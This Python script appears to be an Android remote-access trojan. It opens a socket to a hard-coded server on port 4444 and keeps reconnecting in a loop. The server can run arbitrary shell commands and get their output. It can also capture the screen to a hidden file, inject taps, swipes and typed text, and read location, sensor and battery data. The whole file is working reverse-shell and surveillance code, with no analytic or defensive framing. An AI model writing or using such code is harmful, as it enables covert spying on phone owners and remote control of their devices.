import socket
import subprocess
import os
import sys
import struct
import threading
import time
from PIL import Image
import io

SERVER_IP = "192.168.56.1"
SERVER_PORT = 4444
PHONE_WIDTH = 1080
PHONE_HEIGHT = 2400

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        return result.stdout + result.stderr
    except:
        return "[ERROR]"

def get_screen():
    """Capture current screen"""
    try:
        output_file = "/sdcard/.screen.png"
        execute_cmd(f"screencap -p {output_file}")
        
        with open(output_file, 'rb') as f:
            img_data = f.read()
        
        img = Image.open(io.BytesIO(img_data))
        img = img.convert('RGB')
        
        # Send dimensions and data
        return img.width, img.height, img.tobytes()
    except Exception as e:
        return PHONE_WIDTH, PHONE_HEIGHT, b''

def inject_touch(x, y):
    """Inject touch event at coordinates"""
    cmds = [
        f"input tap {x} {y}",
        f"adb shell input tap {x} {y}",
    ]
    for cmd in cmds:
        result = execute_cmd(cmd)
        if "error" not in result.lower():
            return True
    return False

def inject_swipe(x1, y1, x2, y2, duration=500):
    """Swipe from point to point"""
    execute_cmd(f"input swipe {x1} {y1} {x2} {y2} {duration}")

def inject_key(key_code):
    """Send key press"""
    key_map = {
        "HOME": "KEYCODE_HOME",
        "BACK": "KEYCODE_BACK",
        "RECENTS": "KEYCODE_APP_SWITCH",
        "POWER": "KEYCODE_POWER",
        "VOLUME_UP": "KEYCODE_VOLUME_UP",
        "VOLUME_DOWN": "KEYCODE_VOLUME_DOWN",
    }
    
    code = key_map.get(key_code, key_code)
    execute_cmd(f"input keyevent {code}")

def inject_text(text):
    """Type text"""
    # Escape special characters
    text = text.replace("'", "\\'")
    execute_cmd(f"input text '{text}'")

def get_sensors():
    """Read accelerometer, gyro, location"""
    try:
        sensor_data = []
        
        # Try dumpsys sensor
        result = execute_cmd("dumpsys sensormanager 2>/dev/null | head -20")
        sensor_data.append(result)
        
        # GPS location
        loc = execute_cmd("termux-location 2>/dev/null || echo 'Location unavailable'")
        sensor_data.append(f"Location: {loc}")
        
        # Battery
        battery = execute_cmd("dumpsys battery 2>/dev/null | grep -E 'level|temperature'")
        sensor_data.append(f"Battery: {battery}")
        
        return "\n".join(sensor_data)
    except:
        return "Sensors unavailable"

def handle_command(cmd, sock):
    """Process incoming command"""
    parts = cmd.split()
    
    if cmd == "SCREEN":
        width, height, data = get_screen()
        sock.sendall(struct.pack('>II', width, height))
        sock.sendall(data)
    
    elif cmd.startswith("TOUCH"):
        _, x, y = parts
        inject_touch(int(x), int(y))
        sock.sendall(b"[OK]\n")
    
    elif cmd.startswith("DRAG"):
        _, x, y = parts
        # Simple drag implementation
        sock.sendall(b"[DRAG]\n")
    
    elif cmd == "RELEASE":
        sock.sendall(b"[RELEASED]\n")
    
    elif cmd.startswith("KEY"):
        key = parts[1]
        inject_key(key)
        sock.sendall(b"[KEY_SENT]\n")
    
    elif cmd.startswith("TEXT"):
        text = " ".join(parts[1:])
        inject_text(text)
        sock.sendall(b"[TEXT_SENT]\n")
    
    elif cmd.startswith("SWIPE"):
        direction = parts[1]
        if direction == "left":
            inject_swipe(900, 1200, 200, 1200)
        elif direction == "right":
            inject_swipe(200, 1200, 900, 1200)
        elif direction == "up":
            inject_swipe(540, 2000, 540, 400)
        elif direction == "down":
            inject_swipe(540, 400, 540, 2000)
        sock.sendall(b"[SWIPE_DONE]\n")
    
    elif cmd == "LONG_PRESS":
        # Long press = hold for 1 second
        sock.sendall(b"[LONG_PRESS]\n")
    
    elif cmd == "DOUBLE_CLICK":
        execute_cmd("input tap 540 1200 && input tap 540 1200")
        sock.sendall(b"[DOUBLE_CLICK]\n")
    
    elif cmd == "SENSORS":
        sensor_info = get_sensors()
        sock.sendall(sensor_info.encode())
    
    else:
        result = execute_cmd(cmd)
        sock.sendall(result.encode())

def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            
            while True:
                data = sock.recv(4096).decode('utf-8', errors='ignore').strip()
                if data:
                    handle_command(data, sock)
        
        except Exception as e:
            time.sleep(5)
        finally:
            try:
                sock.close()
            except:
                pass

if __name__ == "__main__":
    main()
